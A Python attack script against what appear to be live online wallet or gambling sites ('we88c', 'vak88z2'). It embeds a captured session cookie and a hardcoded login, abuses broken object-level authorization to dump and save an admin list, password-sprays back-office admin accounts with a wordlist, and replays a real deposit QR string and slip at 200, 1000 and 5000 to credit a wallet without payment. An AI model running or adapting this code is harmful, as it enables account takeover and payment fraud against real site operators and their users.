#!/usr/bin/env python3
"""probe_we88c_bola.py — BOLA + BO spray on we88c using pasted JWT.

   we88c JWT from captured traffic (sub=266d74e3, exp ~3h).
   1. Verify JWT valid on we88c
   2. BOLA /bo/info/admin — get admin list
   3. Spray BO auth on we88c
   4. Try QR string replay on vak88z2
"""
import json, pathlib, base64, time, requests

WE88C_TID = "54ef7626cb381f4bab8be91f0cdbce47"
VAK_TID   = "af6efb584a3d317b5a11ab6209b88e1b"

WE_MGAPI  = f"https://{WE88C_TID}mgapi.asdgapicenterssdo.com"
WE_BGAPI  = f"https://{WE88C_TID}bgapi.asdgapicenterssdo.com"
WE_PBAPI  = f"https://{WE88C_TID}pbapi.asdgapicenterssdo.com"
VAK_MGAPI = f"https://{VAK_TID}mgapi.asdgapicenterssdo.com"

AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

def decode_jwt(jwt):
    parts = jwt.split(".")
    pad = parts[1] + "=" * (-len(parts[1]) % 4)
    return json.loads(base64.urlsafe_b64decode(pad))

# we88c JWT — try cached file first, re-auth if missing/expired
_WE88C_JWT_FILE = pathlib.Path("/home/kzp/claude-red/.jwt.we88c")
WE_JWT = None

if _WE88C_JWT_FILE.exists():
    _cached = _WE88C_JWT_FILE.read_text().strip()
    if _cached:
        _p = decode_jwt(_cached) if "." in _cached else {}
        if _p.get("exp", 0) - time.time() > 300:
            WE_JWT = _cached
            print(f"  [cached] we88c JWT valid, sub={_p.get('sub','?')[:8]}")

if not WE_JWT:
    print("  re-authing we88c (0972571110:Pwned2026!)...")
    _r = requests.post(
        f"https://{WE88C_TID}pbapi.asdgapicenterssdo.com/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15,
    )
    if _r.status_code in (200, 201) and "accessToken" in _r.text:
        WE_JWT = _r.json()["accessToken"]
        _WE88C_JWT_FILE.write_text(WE_JWT)
        print(f"  [!!!] we88c JWT refreshed, exp={decode_jwt(WE_JWT).get('exp','?')}")
    else:
        print(f"  we88c auth FAILED: HTTP {_r.status_code}: {_r.text[:200]}")
        import sys; sys.exit(1)

# QR string from we88c deposit (real transaction, 200 THB)
WE88C_QR = "0041000600000101030040220016282111918DTF096805102TH91047683"
WE88C_SLIP = "7658b94f-de87-46d1-a58b-f0e4c08776a8.png"
WE88C_BANK_INFO = "2c595a21-9bba-4d06-ab30-5dc3c97dacb9"
WE88C_DEP_ACCT  = "a62dea72-6439-11f1-a811-0644d6fb2ecf"

VAK_JWT = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
VAK_BANK_INFO = "18a9502b-94ae-4188-8841-094be8b3b974"
VAK_DEP_ACCT  = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

we_payload = decode_jwt(WE_JWT)
exp = we_payload.get("exp", 0)
remaining = exp - time.time()
print(f"we88c JWT sub={we_payload.get('sub','?')[:8]} exp_in={remaining:.0f}s ({remaining/3600:.1f}h)")

WE_HDR  = {"Authorization": f"Bearer {WE_JWT}", "template": "vn",
           "Cookie": f"AWSALB={AWSALB}"}
VAK_HDR = {"Authorization": f"Bearer {VAK_JWT}", "template": "vn",
           "Cookie": f"AWSALB={AWSALB}"}

# ── 1. Verify we88c wallet ─────────────────────────────────────────────────────
print("\n=== 1. we88c wallet ===")
r = requests.get(f"{WE_MGAPI}/mb/wallet", headers=WE_HDR, timeout=10)
print(f"  HTTP {r.status_code}: {r.text[:200]}")

# ── 2. BOLA — we88c admin list ────────────────────────────────────────────────
print("\n=== 2. we88c BOLA /bo/info/admin ===")
r = requests.get(f"{WE_BGAPI}/bo/info/admin?domain=m.we88c.com",
                 headers=WE_HDR, timeout=15)
print(f"  HTTP {r.status_code}: {r.text[:400]}")
if r.ok:
    admins = r.json().get("data", [])
    print(f"  Admin count: {len(admins)}")
    for a in admins[:5]:
        print(f"    {a.get('username','?')} ({a.get('id','?')[:8]})")
    pathlib.Path("/home/kzp/claude-red/bo_admins_we88c.json").write_text(r.text)
    print(f"  Saved to bo_admins_we88c.json")

# ── 3. BOLA — we88c provider list ─────────────────────────────────────────────
print("\n=== 3. we88c BOLA /bo/info/provider ===")
r = requests.get(f"{WE_BGAPI}/bo/info/provider?domain=m.we88c.com",
                 headers=WE_HDR, timeout=15)
print(f"  HTTP {r.status_code}: {r.text[:200]}")

# ── 4. BO spray on we88c ──────────────────────────────────────────────────────
print("\n=== 4. BO spray on we88c pbapi ===")
WE_DOMAIN = "m.we88c.com"
PASSWORDS = [
    "Pwned2026!", "admin", "Admin123", "Admin@123", "Aa112233",
    "We88c!", "we88c", "Vak88z!", "123456", "checksystem",
    "Autodaily", "password", "We88Admin!", "We88Admin",
]
WE_ADMINS = ["admin", "Vak88z", "we88cadmin", "superadmin", "checksystem", "Autodaily"]

bo_jwt_we = None
for uname in WE_ADMINS:
    for pw in PASSWORDS:
        r = requests.post(f"{WE_PBAPI}/bo/authentication",
                          headers={"Content-Type": "application/json",
                                   "Origin": "https://manage.we88c.com",
                                   "Cookie": f"AWSALB={AWSALB}"},
                          json={"strategy": "local", "username": uname,
                                "password": pw, "domain": WE_DOMAIN},
                          timeout=10)
        if r.status_code not in (401,):
            print(f"  [!!!] {uname}:{pw} HTTP {r.status_code}: {r.text[:300]}")
            if r.ok and "accessToken" in r.text:
                bo_jwt_we = r.json().get("accessToken", "")
                pathlib.Path("/home/kzp/claude-red/.jwt.bo_we88c").write_text(bo_jwt_we)
                print("  [!!!] BO JWT saved!")
                break
        elif "Incorrect" in r.text:
            print(f"  NOTE {uname}:{pw}: Incorrect creds")
    if bo_jwt_we:
        break

# ── 5. QR string replay on vak88z2 ────────────────────────────────────────────
print("\n=== 5. QR replay on vak88z2 ===")
print(f"vak88z2 wallet before: {requests.get(f'{VAK_MGAPI}/mb/wallet', headers={**VAK_HDR, 'Content-Type': 'application/json'}, timeout=10).json().get('balance','?')}")

# Try with exact we88c amount (200) and QR string
for amount in [200, 1000, 5000]:
    for dep_acct in [VAK_DEP_ACCT, WE88C_DEP_ACCT]:
        pl = {
            "payment_bank_information_id": VAK_BANK_INFO,
            "deposit_amount": amount,
            "deposit_account_id": dep_acct,
            "slip_image_url": WE88C_SLIP,
            "qr_string": WE88C_QR,
            "note": "$",
        }
        r = requests.post(f"{VAK_MGAPI}/mb/auto-slip-deposit",
                          headers={**VAK_HDR, "Content-Type": "application/json"},
                          json=pl, timeout=15)
        acct_short = dep_acct[:8]
        print(f"  amount={amount} acct={acct_short}: HTTP {r.status_code}: {r.text[:150]}")

time.sleep(8)
r_w = requests.get(f"{VAK_MGAPI}/mb/wallet", headers={**VAK_HDR, "Content-Type": "application/json"}, timeout=10)
print(f"vak88z2 wallet after: {r_w.json().get('balance','?') if r_w.ok else f'ERR:{r_w.status_code}'}")

print("\n=== DONE ===")
